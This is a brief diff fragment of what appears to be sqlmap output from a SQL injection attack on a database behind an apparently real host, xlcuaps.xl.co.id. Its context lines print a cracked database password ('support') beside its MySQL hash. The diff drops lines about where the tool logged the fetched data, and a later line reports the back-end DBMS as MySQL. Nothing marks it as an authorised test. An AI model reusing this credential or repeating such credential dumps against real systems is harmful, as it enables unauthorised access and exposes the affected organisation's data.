@@ -72,10 +72,6 @@ database management system users password hashes:
     clear-text password: support
     password hash: *748C78DA84266E6825ADDF0887831A044D52CC0B
 
-[15:10:37] [INFO] fetched data logged to text files under '/root/.sqlmap/output/xlcuaps.xl.co.id'
-
-[*] shutting down at 15:10:37
-
 
 
 [15:11:32] [INFO] the back-end DBMS is MySQL
